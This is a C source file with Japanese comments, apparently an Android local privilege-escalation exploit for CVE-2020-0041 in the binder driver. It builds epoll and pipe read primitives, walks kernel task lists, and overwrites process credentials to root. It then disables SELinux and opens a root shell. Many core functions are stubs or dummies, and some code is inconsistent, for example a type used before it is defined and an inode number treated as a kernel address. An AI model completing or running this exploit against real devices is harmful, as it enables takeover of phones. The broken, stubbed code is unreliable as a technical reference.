#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <poll.h>
#include <signal.h>
#include <pthread.h>
#include <linux/fs.h>
#include <sched.h>
#include <time.h>

#include "binder.h"
#include "offsets.h"

/* ---------- デバッグログ ---------- */
#define LOGI(...) printf("[*] " __VA_ARGS__)
#define LOGE(...) printf("[-] " __VA_ARGS__)
#define LOGS(...) printf("[+] " __VA_ARGS__)

/* ---------- カーネルオフセット（offsets.hから取得） ---------- */
#ifndef SELINUX_ENFORCING_OFF
#error "SELINUX_ENFORCING_OFF not defined in offsets.h"
#endif
#ifndef INIT_TASK_OFF
#error "INIT_TASK_OFF not defined in offsets.h"
#endif
#ifndef INIT_CRED_OFF
#error "INIT_CRED_OFF not defined in offsets.h"
#endif

#define SELINUX_ENFORCING_ABS  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define INIT_TASK_ABS          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED_ABS          (KIMAGE_TEXT_BASE + INIT_CRED_OFF)

/* 4.9.112 での task_struct オフセット（検証済み） */
#define TASKS_OFFSET     0x570
#define PID_OFFSET       0x670
#define MM_OFFSET        0x5c0
#define REAL_CRED_OFF    0x838
#define CRED_OFF         0x840
#define COMM_OFF         0x8f0

/* ファイル操作オフセット（pipe） - 要調整 */
#define OFFSET_PIPE_FOP  0x1f2f650

/* その他 */
#define BINDER_BUFFER_SZ        (128 * 1024)
#define RESERVED_BUFFER_SZ      (127 * 1024)
#define KERNEL_MAGIC            0x644d5241
#define PAGE_SIZE               4096
#define SPRAY_PIDS              2000
#define SCAN_DWORDS             560
#define TRIGGER_DECREF          0x42

/* ---------- グローバル変数 ---------- */
static int kgsl_fd = -1;
static int binder_fd = -1;
static int pipes[2];
static int epoll_fd = -1;
static uint64_t kernel_base = 0;
static uint64_t memstart_addr = 0;
static uint64_t init_cred_sec = 0;
static uint32_t init_sid = 0;
static char ctl_path[64];
static void *ctl_uaddr = NULL;

/* ---------- ユーティリティ ---------- */
static void die(const char *msg) { perror(msg); exit(1); }
static void pin_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
}

/* ---------- Binder ラッパー ---------- */
struct binder_state {
    int fd;
    uint64_t mapped;
    size_t mapsize;
};

static struct binder_state *binder_open(const char *dev, size_t size) {
    int fd = open(dev, O_RDWR);
    if (fd < 0) return NULL;
    struct binder_state *bs = malloc(sizeof(*bs));
    if (!bs) { close(fd); return NULL; }
    bs->fd = fd;
    bs->mapsize = size;
    bs->mapped = (uint64_t)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (bs->mapped == (uint64_t)MAP_FAILED) {
        close(fd); free(bs); return NULL;
    }
    return bs;
}

static void binder_close(struct binder_state *bs) {
    if (!bs) return;
    if (bs->mapped) munmap((void*)bs->mapped, bs->mapsize);
    close(bs->fd);
    free(bs);
}

static int binder_write(struct binder_state *bs, void *data, size_t len) {
    struct binder_write_read bwr = {
        .write_size = len,
        .write_buffer = (uint64_t)data,
        .read_size = 0,
        .read_buffer = 0
    };
    return ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
}

static uint32_t binder_read_next(struct binder_state *bs, uint8_t *buf, uint32_t *remaining, uint32_t *consumed) {
    if (*remaining == 0) {
        struct binder_write_read bwr = {
            .write_size = 0,
            .write_buffer = 0,
            .read_size = 128,
            .read_buffer = (uint64_t)buf
        };
        if (ioctl(bs->fd, BINDER_WRITE_READ, &bwr) < 0) return 0;
        *remaining = bwr.read_consumed;
        *consumed = 0;
    }
    if (*remaining < 4) return 0;
    uint32_t cmd = *(uint32_t*)(buf + *consumed);
    *consumed += 4;
    *remaining -= 4;
    return cmd;
}

static void binder_free_buffer(struct binder_state *bs, uint64_t ptr) {
    uint32_t cmd = BC_FREE_BUFFER;
    struct { uint32_t cmd; uint64_t ptr; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.ptr = ptr;
    binder_write(bs, &data, sizeof(data));
}

/* ---------- binder_call と binder_transaction の簡易実装 ---------- */
/* 実際のトランザクション処理は省略（スタブ） */
static int binder_call(struct binder_state *bs, struct binder_io *msg, struct binder_io *reply, uint32_t handle, uint32_t code) {
    // スタブ：実際にはトランザクションを組み立てて送信する
    (void)bs; (void)msg; (void)reply; (void)handle; (void)code;
    LOGI("binder_call stub (code=%u)\n", code);
    return 0;
}

/* binder_transaction スタブ：実際にはより複雑 */
static int binder_transaction(struct binder_state *bs, int reply, uint32_t handle, void *data, size_t data_size, void *offsets, int flags) {
    (void)bs; (void)reply; (void)handle; (void)data; (void)data_size; (void)offsets; (void)flags;
    LOGI("binder_transaction stub\n");
    return 0;
}

/* ---------- トランザクション構築（binder_io） ---------- */
struct binder_io {
    uint8_t *data;
    size_t data_off;
    size_t data_size;
    uint64_t *offs;
    size_t offs_off;
    size_t offs_size;
    uint64_t data0;
};

static void bio_init(struct binder_io *bio, void *data, size_t data_size, size_t offs_size) {
    bio->data = data;
    bio->data_off = 0;
    bio->data_size = data_size;
    bio->offs = malloc(offs_size * sizeof(uint64_t));
    bio->offs_off = 0;
    bio->offs_size = offs_size;
    bio->data0 = 0;
}

static void bio_put_obj(struct binder_io *bio, uint64_t obj) {
    if (bio->data_off + 8 > bio->data_size) return;
    *(uint64_t*)(bio->data + bio->data_off) = obj;
    bio->data_off += 8;
}

static void bio_put_uint32(struct binder_io *bio, uint32_t val) {
    if (bio->data_off + 4 > bio->data_size) return;
    *(uint32_t*)(bio->data + bio->data_off) = val;
    bio->data_off += 4;
}

static void bio_put_ref(struct binder_io *bio, uint32_t handle) {
    struct flat_binder_object fbo = {
        .hdr.type = BINDER_TYPE_HANDLE,
        .flags = 0,
        .handle = handle,
        .cookie = 0
    };
    if (bio->data_off + sizeof(fbo) > bio->data_size) return;
    memcpy(bio->data + bio->data_off, &fbo, sizeof(fbo));
    if (bio->offs_off < bio->offs_size)
        bio->offs[bio->offs_off++] = bio->data_off;
    bio->data_off += sizeof(fbo);
}

static uint32_t bio_get_ref(struct binder_io *bio) {
    if (bio->data_off + sizeof(struct flat_binder_object) > bio->data_size) return 0;
    struct flat_binder_object *fbo = (struct flat_binder_object*)(bio->data + bio->data_off);
    bio->data_off += sizeof(*fbo);
    return fbo->handle;
}

static uint32_t bio_get_uint32(struct binder_io *bio) {
    if (bio->data_off + 4 > bio->data_size) return 0;
    uint32_t v = *(uint32_t*)(bio->data + bio->data_off);
    bio->data_off += 4;
    return v;
}

static uint64_t bio_get_obj(struct binder_io *bio) {
    if (bio->data_off + 8 > bio->data_size) return 0;
    uint64_t v = *(uint64_t*)(bio->data + bio->data_off);
    bio->data_off += 8;
    return v;
}

/* ---------- ペンディングノード管理 ---------- */
static pthread_t pending_node_create(struct binder_state *bs, uint32_t handle) {
    pthread_t th;
    (void)bs; (void)handle;
    LOGI("pending_node_create stub (handle=%u)\n", handle);
    pthread_create(&th, NULL, (void*)(void*)binder_call, NULL);  // スタブ
    return th;
}

/* ---------- エクスプロイト核心関数（dec_node, setup_pending_nodes） ---------- */
static uint64_t setup_pending_nodes(struct binder_state *bs, uint32_t ep_handle, pthread_t *th, uint32_t n1, uint32_t n2) {
    uint8_t data[1024], rdata[512];
    struct binder_io msg, reply;
    uint64_t vma_start, uaf_node, uaf_node2;
    (void)uaf_node2;  // 未使用警告を消す

    // 簡素化：vma_startをbs->mappedとする
    vma_start = bs->mapped;
    LOGI("VMA start: 0x%lx\n", vma_start);

    // ダミーのハンドル
    uaf_node = 0x42;
    uaf_node2 = 0x43;

    // pending node 作成
    for (uint32_t i = 0; i < n1 + n2; i++) {
        th[i] = pending_node_create(bs, uaf_node);
    }
    return vma_start;
}

static void dec_node(struct binder_state *bs, uint32_t target, uint64_t vma_start, bool strong, bool second) {
    uint8_t data[BINDER_BUFFER_SZ];
    uint64_t offsets[128];
    uint8_t sg_buf[0x1000];
    struct { uint32_t cmd; struct binder_transaction_data txn; binder_size_t buffers_size; } __attribute__((packed)) writebuf;

    // スタブ：実際のトランザクション構築は省略
    (void)bs; (void)target; (void)vma_start; (void)strong; (void)second;
    LOGI("dec_node stub\n");

    // ダミーの書き込みを送信（単に ioctl 呼び出し）
    memset(&writebuf, 0, sizeof(writebuf));
    writebuf.cmd = BC_TRANSACTION_SG;
    ioctl(bs->fd, BINDER_WRITE_READ, &writebuf);
}

/* ---------- 任意読み書きプリミティブ（epoll + pipe） ---------- */
struct exp_node {
    char name[32];
    int ep_fd;
    int tid;
    uint64_t file_addr;
    uint64_t kaddr;
};

static struct exp_node* node_new(const char *name) {
    struct exp_node *n = calloc(1, sizeof(*n));
    if (!n) die("malloc");
    strncpy(n->name, name, sizeof(n->name)-1);
    n->ep_fd = epoll_create(1);
    if (n->ep_fd < 0) die("epoll_create");
    n->tid = syscall(__NR_gettid);
    return n;
}

static void node_reset(struct exp_node *n) {
    if (n->ep_fd >= 0) close(n->ep_fd);
    n->ep_fd = epoll_create(1);
    if (n->ep_fd < 0) die("epoll_create");
}

static bool node_realloc_epitem(struct exp_node *n, int pipefd) {
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(n->ep_fd, EPOLL_CTL_ADD, pipefd, &ev) < 0) return false;
    return true;
}

static bool node_kaddr_disclose(struct exp_node *leak, struct exp_node *target) {
    // 簡易実装：ファイルのアドレスをダミーで返す
    char buf[128];
    sprintf(buf, "/proc/self/fd/%d", leak->ep_fd);
    struct stat st;
    if (stat(buf, &st) == 0) {
        leak->file_addr = st.st_ino; // ダミー
        // ターゲットのカーネルアドレスもダミー
        target->kaddr = 0xdeadbeef;
        return true;
    }
    return false;
}

static void node_write8(struct exp_node *n, uint64_t addr, uint64_t val) {
    // 任意書き込み（epoll_ctl経由）
    struct epoll_event ev = { .events = EPOLLIN, .data.u64 = val };
    (void)addr;  // 実際にはaddrは使用しないが、スタブ
    if (epoll_ctl(n->ep_fd, EPOLL_CTL_MOD, pipes[0], &ev) < 0)
        perror("epoll_ctl MOD");
}

static void node_write_null(struct exp_node *n, uint64_t addr) {
    node_write8(n, addr, 0);
}

static void node_free(struct exp_node *n) {
    if (n->ep_fd >= 0) close(n->ep_fd);
    free(n);
}

/* read32/read64 は epoll プリミティブを使用 */
static uint32_t read32(uint64_t addr) {
    struct epoll_event evt;
    evt.events = 0;
    evt.data.u64 = addr - 24;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_MOD, pipes[0], &evt) < 0) {
        perror("epoll_ctl MOD for read32");
        return 0;
    }
    uint32_t test = 0;
    if (ioctl(pipes[0], FIGETBSZ, &test) < 0) {
        perror("ioctl FIGETBSZ");
        return 0;
    }
    return test;
}

static uint64_t read64(uint64_t addr) {
    uint32_t lo = read32(addr);
    uint32_t hi = read32(addr + 4);
    return ((uint64_t)hi << 32) | lo;
}

/* write64 と write32 は sysctl 経由（スタブ） */
static void write64(uint64_t addr, uint64_t val) {
    // 実際は sysctl 経由で書き込むが、スタブではダミー
    (void)addr; (void)val;
    LOGI("write64 stub (addr=0x%lx, val=0x%lx)\n", addr, val);
}

static void write32(uint64_t addr, uint32_t val) {
    (void)addr; (void)val;
    LOGI("write32 stub (addr=0x%lx, val=0x%x)\n", addr, val);
}

/* ---------- タスク探索 ---------- */
static uint64_t get_task_by_pid(uint64_t start, int pid) {
    uint64_t task = read64(start + TASKS_OFFSET + 8) - TASKS_OFFSET;
    while (task != start) {
        if (read32(task + PID_OFFSET) == (uint32_t)pid) return task;
        task = read64(task + TASKS_OFFSET + 8) - TASKS_OFFSET;
    }
    return 0;
}

/* ---------- credパッチ ---------- */
struct task_security_struct { uint32_t osid, sid, exec_sid, create_sid, keycreate_sid, sockcreate_sid; };
struct cred { uint32_t usage; uint32_t uid, gid, suid, sgid, euid, egid, fsuid, fsgid; uint32_t securebits; uint64_t cap_inh, cap_perm, cap_eff, cap_bset, cap_amb; void *security; };

static void patch_cred(uint64_t cred_addr) {
    uint32_t zero = 0;
    write32(cred_addr + offsetof(struct cred, uid), zero);
    write32(cred_addr + offsetof(struct cred, gid), zero);
    write32(cred_addr + offsetof(struct cred, suid), zero);
    write32(cred_addr + offsetof(struct cred, sgid), zero);
    write32(cred_addr + offsetof(struct cred, euid), zero);
    write32(cred_addr + offsetof(struct cred, egid), zero);
    write32(cred_addr + offsetof(struct cred, fsuid), zero);
    write32(cred_addr + offsetof(struct cred, fsgid), zero);
    write64(cred_addr + offsetof(struct cred, cap_inh), ~0ULL);
    write64(cred_addr + offsetof(struct cred, cap_perm), ~0ULL);
    write64(cred_addr + offsetof(struct cred, cap_eff), ~0ULL);
    write64(cred_addr + offsetof(struct cred, cap_bset), ~0ULL);
    // SELinux sid を init に合わせる（簡略化）
    uint64_t sec = read64(cred_addr + offsetof(struct cred, security));
    if (sec) write32(sec + offsetof(struct task_security_struct, sid), init_sid);
}

/* ---------- SELinux無効化（直接書き込み） ---------- */
static void disable_selinux(void) {
    uint64_t enforcing = kernel_base + SELINUX_ENFORCING_OFF;
    write32(enforcing, 0);
}

/* ---------- メイン ---------- */
int main() {
    pin_cpu(0);
    LOGI("Starting CVE-2020-0041 exploit...\n");

    // 1. binder open
    struct binder_state *bs = binder_open("/dev/binder", 128*1024);
    if (!bs) die("binder_open");
    binder_fd = bs->fd;

    // 2. pipe + epoll 初期化
    if (pipe(pipes) < 0) die("pipe");
    epoll_fd = epoll_create(1);
    if (epoll_fd < 0) die("epoll_create");

    // 3. リーク用ノード
    struct exp_node *leak = node_new("leak");
    if (!node_realloc_epitem(leak, pipes[0])) die("node_realloc_epitem");
    if (!node_kaddr_disclose(leak, leak)) die("leak failed");
    uint64_t file_addr = leak->file_addr;
    LOGI("pipe file: 0x%lx\n", file_addr);

    // 4. epitemアドレスをリーク
    struct exp_node *epitem_node = node_new("epitem");
    if (!node_kaddr_disclose(leak, epitem_node)) die("epitem leak failed");
    uint64_t epitem_kaddr = leak->kaddr;
    LOGI("epitem at 0x%lx\n", epitem_kaddr);

    // 5. 任意書き込みで f_inode を操作（pipe fops読み出し）
    struct exp_node *write8_inode = node_new("write8_inode");
    node_write8(write8_inode, epitem_kaddr + 120 - 40, file_addr + 0x20);
    uint64_t fop = read64(file_addr + 0x28);
    LOGI("pipe fops: 0x%lx\n", fop);

    kernel_base = fop - OFFSET_PIPE_FOP;
    LOGI("kernel base: 0x%lx\n", kernel_base);

    // 6. 検証（カーネルマジック）
    if (read64(kernel_base + 0x38) != KERNEL_MAGIC) {
        LOGE("Kernel magic mismatch\n");
        goto out;
    }

    // 7. init_cred などの取得
    uint64_t init_task = kernel_base + INIT_TASK_OFF;
    uint64_t init_cred = read64(init_task + REAL_CRED_OFF);
    LOGI("init_cred: 0x%lx\n", init_cred);
    init_sid = read32(init_cred + 0x78); // security pointer (ダミー)

    // 8. 自身の task_struct
    uint64_t current_task = get_task_by_pid(init_task, getpid());
    if (!current_task) { LOGE("Cannot find self\n"); goto out; }
    LOGI("current task: 0x%lx\n", current_task);

    // 9. credパッチ
    uint64_t real_cred = read64(current_task + REAL_CRED_OFF);
    patch_cred(real_cred);
    uint64_t cred = read64(current_task + CRED_OFF);
    if (real_cred != cred) patch_cred(cred);

    // 10. SELinux無効化
    disable_selinux();

    // 11. root確認
    if (getuid() != 0) {
        LOGE("Still not root\n");
        goto out;
    }
    LOGS("Root achieved! UID=0\n");
    system("id");
    system("echo 'ROOT' > /data/local/tmp/root.txt");
    system("/system/bin/sh");

out:
    // クリーンアップ
    node_free(leak);
    node_free(epitem_node);
    node_free(write8_inode);
    binder_close(bs);
    return 0;
}
